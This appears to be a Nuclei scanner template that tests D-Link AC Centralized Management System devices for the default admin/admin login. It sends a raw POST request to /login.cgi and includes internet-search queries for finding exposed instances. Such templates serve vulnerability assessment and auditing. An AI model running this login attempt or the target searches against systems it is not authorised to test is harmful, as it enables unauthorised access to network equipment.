id: dlink-centralized-default-login
info:
  name: D-Link AC Centralized Management System - Default Login
  author: SleepingBag945
  severity: high
  description: |
    D-Link AC Centralized Management System default login credentials were discovered.
  metadata:
    runzero-match: any(each(service["html.titles"]), {# matches "(?i)AC集中管理平台"})
    fofa-query: title="AC集中管理平台" && body="D-Link路由器管理页"
    max-request: 1
    verified: true
  tags: default-login,dlink,vuln
http:
  - attack: pitchfork
    matchers:
      - condition: and
        dsl:
          - status_code_1 == 200 && !contains(body_1,"flag=0")
        type: dsl
      - condition: and
        part: header
        type: word
        words:
          - Set-Cookie
          - ac_userid
      - condition: and
        part: body
        type: word
        words:
          - window.open
    matchers-condition: and
    payloads:
      password:
        - admin
      username:
        - admin
    raw:
      - |
        POST /login.cgi  HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        user={{username}}&password={{password}}
